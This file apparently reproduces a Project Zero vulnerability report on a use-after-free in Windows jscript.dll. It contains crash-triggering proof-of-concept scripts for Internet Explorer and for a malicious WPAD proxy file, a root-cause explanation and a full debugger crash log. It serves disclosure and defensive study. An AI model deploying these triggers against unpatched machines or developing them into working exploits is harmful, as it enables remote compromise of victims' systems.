@@ -1,0 +1,186 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1376
+
+There is a use-after-free vulnerability in jscript.dll. This issue could potentially be exploited through multiple vectors:
+
+ - An attacker on the local network could exploit this issue by posing as a WPAD (Web Proxy Auto-Discovery) host and sending a malicious wpad.dat file to the victim. This works because wpad.dat files are JavaScript files interpreted with jscript.dll on the WPAD client. Note that, in this case, an attacker who successfully exploited the vulnerability would gain the same privileges as the WinHTTP Web Proxy Auto-Discovery Service.
+
+ - The issue can also be exploited by opening a malicious web page in Internet Explorer.
+
+The issue has been verified on 64-bit Win7 with the most recent patches applied.
+
+PoC for Internet Explorer (might require page heap to trigger the crash):
+
+============================================
+-->
+
+<!-- saved from url=(0014)about:internet -->
+<meta http-equiv="X-UA-Compatible" content="IE=8"></meta>
+<script language="Jscript.Encode">
+
+var vars = new Array(100);
+for(var i=0;i<100;i++) vars[i] = {};
+
+function f() {
+  vars[1] = 1;
+  CollectGarbage();
+  return {};
+}
+
+vars[1].toString = f;
+Array.prototype.join.call(vars);
+
+</script>
+
+<!--
+============================================
+
+PoC for WPAD (might require page heap to trigger the crash):
+
+============================================
+
+function FindProxyForURL(url, host) {
+
+var vars = new Array(100);
+for(var i=0;i<100;i++) vars[i] = {};
+
+function f() {
+  vars[1] = 1;
+  CollectGarbage();
+  return {};
+}
+
+vars[1].toString = f;
+Array.prototype.join.call(vars);
+
+return "DIRECT";
+}
+
+===========================================
+
+Technical details:
+
+The issue is in NameTbl::GetValDef which is called when an object is converted to a string. The function attempts to call toString() or valueOf() of the NameTbl object 2 times or until the return value isn't an JavaScript object. The issue is that the NameTbl object on which these methods are called isn't explicitly tracked by the garbage collector, which means the object can be deleted inside the toString/valueOf callback (as long as it's not tracked by the garbage collector somewhere else). Basically, toString/valueOf can delete its 'this' object.
+
+Note that the crash location in the Debug log immediately precedes a virtual method call.
+
+Debug log (from IE, but it looks similar in the WPAD service):
+
+============================================
+
+(a68.e4c): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+jscript!NameTbl::GetValDef+0x58:
+000007fe`f5dea398 498b06          mov     rax,qword ptr [r14] ds:00000000`044d9f90=????????????????
+
+0:013> r
+rax=0000000000000001 rbx=000007fef5d7bd50 rcx=00000000044acfa0
+rdx=0000000000000000 rsi=0000000012b49fb8 rdi=0000000000000001
+rip=000007fef5dea398 rsp=0000000012b49ae0 rbp=0000000000000000
+ r8=0000000004309f20  r9=0000000004309670 r10=0000000000000081
+r11=0000000012b49a60 r12=0000000000000080 r13=0000000000000008
+r14=00000000044d9f90 r15=0000000000000000
+iopl=0         nv up ei ng nz ac po cy
+cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010297
+jscript!NameTbl::GetValDef+0x58:
+000007fe`f5dea398 498b06          mov     rax,qword ptr [r14] ds:00000000`044d9f90=????????????????
+
+0:013> k
+ # Child-SP          RetAddr           Call Site
+00 00000000`12b49ae0 000007fe`f5dad069 jscript!NameTbl::GetValDef+0x58
+01 00000000`12b49b70 000007fe`f5d7de69 jscript!NameTbl::InvokeInternal+0xb07
+02 00000000`12b49c90 000007fe`f5d7bf3b jscript!VAR::GetValue+0xa1
+03 00000000`12b49ce0 000007fe`f5ddb65d jscript!ConvertToString+0x5b
+04 00000000`12b49f60 000007fe`f5d7c2ec jscript!JsArrayJoin+0x38d
+05 00000000`12b4a060 000007fe`f5d7a9fe jscript!NatFncObj::Call+0x138
+06 00000000`12b4a110 000007fe`f5d786ea jscript!NameTbl::InvokeInternal+0x3f8
+07 00000000`12b4a230 000007fe`f5dcdd72 jscript!VAR::InvokeByDispID+0xffffffff`ffffffea
+08 00000000`12b4a280 000007fe`f5d7c2ec jscript!JsFncCall+0xc2
+09 00000000`12b4a310 000007fe`f5d7a9fe jscript!NatFncObj::Call+0x138
+0a 00000000`12b4a3c0 000007fe`f5d7b234 jscript!NameTbl::InvokeInternal+0x3f8
+0b 00000000`12b4a4e0 000007fe`f5d79852 jscript!VAR::InvokeByName+0x81c
+0c 00000000`12b4a6f0 000007fe`f5d79929 jscript!VAR::InvokeDispName+0x72
+0d 00000000`12b4a770 000007fe`f5d724b8 jscript!VAR::InvokeByDispID+0x1229
+0e 00000000`12b4a7c0 000007fe`f5d78ec2 jscript!CScriptRuntime::Run+0x5a6
+0f 00000000`12b4b5c0 000007fe`f5d78d2b jscript!ScrFncObj::CallWithFrameOnStack+0x162
+10 00000000`12b4b7d0 000007fe`f5d78b95 jscript!ScrFncObj::Call+0xb7
+11 00000000`12b4b870 000007fe`f5d7e6c0 jscript!CSession::Execute+0x19e
+12 00000000`12b4b940 000007fe`f5d870e7 jscript!COleScript::ExecutePendingScripts+0x17a
+13 00000000`12b4ba10 000007fe`f5d868d6 jscript!COleScript::ParseScriptTextCore+0x267
+14 00000000`12b4bb00 000007fe`ead55251 jscript!COleScript::ParseScriptText+0x56
+15 00000000`12b4bb60 000007fe`eb4db320 MSHTML!CActiveScriptHolder::ParseScriptText+0xc1
+16 00000000`12b4bbe0 000007fe`ead56256 MSHTML!CScriptCollection::ParseScriptText+0x37f
+17 00000000`12b4bcc0 000007fe`ead55c8e MSHTML!CScriptData::CommitCode+0x3d9
+18 00000000`12b4be90 000007fe`ead55a11 MSHTML!CScriptData::Execute+0x283
+19 00000000`12b4bf50 000007fe`eb5146fb MSHTML!CHtmScriptParseCtx::Execute+0x101
+1a 00000000`12b4bf90 000007fe`eadf8a5b MSHTML!CHtmParseBase::Execute+0x235
+1b 00000000`12b4c030 000007fe`eacd2e39 MSHTML!CHtmPost::Broadcast+0x90
+1c 00000000`12b4c070 000007fe`ead2caef MSHTML!CHtmPost::Exec+0x4bb
+1d 00000000`12b4c280 000007fe`ead2ca40 MSHTML!CHtmPost::Run+0x3f
+1e 00000000`12b4c2b0 000007fe`ead2da12 MSHTML!PostManExecute+0x70
+1f 00000000`12b4c330 000007fe`ead30843 MSHTML!PostManResume+0xa1
+20 00000000`12b4c370 000007fe`ead16fc7 MSHTML!CHtmPost::OnDwnChanCallback+0x43
+21 00000000`12b4c3c0 000007fe`eb544f78 MSHTML!CDwnChan::OnMethodCall+0x41
+22 00000000`12b4c3f0 000007fe`eac39d75 MSHTML!GlobalWndOnMethodCall+0x240
+23 00000000`12b4c490 00000000`77709bbd MSHTML!GlobalWndProc+0x150
+24 00000000`12b4c510 00000000`777098c2 USER32!UserCallWinProcCheckWow+0x1ad
+25 00000000`12b4c5d0 000007fe`f2be4a87 USER32!DispatchMessageWorker+0x3b5
+26 00000000`12b4c650 000007fe`f2bebabb IEFRAME!CTabWindow::_TabWindowThreadProc+0x555
+27 00000000`12b4f8d0 000007fe`fe88572f IEFRAME!LCIETab_ThreadProc+0x3a3
+28 00000000`12b4fa00 000007fe`f5ff925f iertutil!_IsoThreadProc_WrapperToReleaseScope+0x1f
+29 00000000`12b4fa30 00000000`775e59cd IEShims!NS_CreateThread::DesktopIE_ThreadProc+0x9f
+2a 00000000`12b4fa80 00000000`7781a561 kernel32!BaseThreadInitThunk+0xd
+2b 00000000`12b4fab0 00000000`00000000 ntdll!RtlUserThreadStart+0x1d
+
+0:013> !heap -p -a 00000000`044d9f90
+    address 00000000044d9f90 found in
+    _DPH_HEAP_ROOT @ 3fd1000
+    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)
+                                    3fe0680:          44d9000             2000
+    000007fef5f78726 verifier!AVrfDebugPageHeapFree+0x00000000000000a2
+    00000000778b4255 ntdll!RtlDebugFreeHeap+0x0000000000000035
+    000000007785797c ntdll! ?? ::FNODOBFM::`string'+0x000000000000e982
+    000007feff2110c8 msvcrt!free+0x000000000000001c
+    000007fef5d7bad2 jscript!NativeErrorProtoObj<16>::`vector deleting destructor'+0x0000000000000022
+    000007fef5d7b938 jscript!NameTbl::SetMasterVariant+0x000000000000a240
+    000007fef5d942cb jscript!GcAlloc::ReclaimGarbage+0x000000000000034d
+    000007fef5d719e2 jscript!GcContext::Reclaim+0x00000000000000ae
+    000007fef5d81956 jscript!GcContext::CollectCore+0x000000000000018b
+    000007fef5d817a5 jscript!GcContext::Collect+0x0000000000000025
+    000007fef5dc42f3 jscript!JsCollectGarbage+0x0000000000000023
+    000007fef5d7c2ec jscript!NatFncObj::Call+0x0000000000000138
+    000007fef5d7c199 jscript!NameTbl::InvokeInternal+0x0000000000000377
+    000007fef5d786ea jscript!VAR::InvokeByDispID+0xffffffffffffffea
+    000007fef5d724b8 jscript!CScriptRuntime::Run+0x00000000000005a6
+    000007fef5d78ec2 jscript!ScrFncObj::CallWithFrameOnStack+0x0000000000000162
+    000007fef5d78d2b jscript!ScrFncObj::Call+0x00000000000000b7
+    000007fef5da2084 jscript!NameTbl::InvokeInternal+0x000000000000060f
+    000007fef5d786ea jscript!VAR::InvokeByDispID+0xffffffffffffffea
+    000007fef5dea422 jscript!NameTbl::GetValDef+0x00000000000000e2
+    000007fef5dad069 jscript!NameTbl::InvokeInternal+0x0000000000000b07
+    000007fef5d7de69 jscript!VAR::GetValue+0x00000000000000a1
+    000007fef5d7bf3b jscript!ConvertToString+0x000000000000005b
+    000007fef5ddb65d jscript!JsArrayJoin+0x000000000000038d
+    000007fef5d7c2ec jscript!NatFncObj::Call+0x0000000000000138
+    000007fef5d7a9fe jscript!NameTbl::InvokeInternal+0x00000000000003f8
+    000007fef5d786ea jscript!VAR::InvokeByDispID+0xffffffffffffffea
+    000007fef5dcdd72 jscript!JsFncCall+0x00000000000000c2
+    000007fef5d7c2ec jscript!NatFncObj::Call+0x0000000000000138
+    000007fef5d7a9fe jscript!NameTbl::InvokeInternal+0x00000000000003f8
+    000007fef5d7b234 jscript!VAR::InvokeByName+0x000000000000081c
+    000007fef5d79852 jscript!VAR::InvokeDispName+0x0000000000000072
+
+0:013> u rip
+jscript!NameTbl::GetValDef+0x58:
+000007fe`f5dea398 498b06          mov     rax,qword ptr [r14]
+000007fe`f5dea39b 488b98e0000000  mov     rbx,qword ptr [rax+0E0h]
+000007fe`f5dea3a2 488bcb          mov     rcx,rbx
+000007fe`f5dea3a5 ff15b5320400    call    qword ptr [jscript!_guard_check_icall_fptr (000007fe`f5e2d660)]
+000007fe`f5dea3ab 488b54fc40      mov     rdx,qword ptr [rsp+rdi*8+40h]
+000007fe`f5dea3b0 4c8d442450      lea     r8,[rsp+50h]
+000007fe`f5dea3b5 498bce          mov     rcx,r14
+000007fe`f5dea3b8 ffd3            call    rbx
+
+============================================
+-->
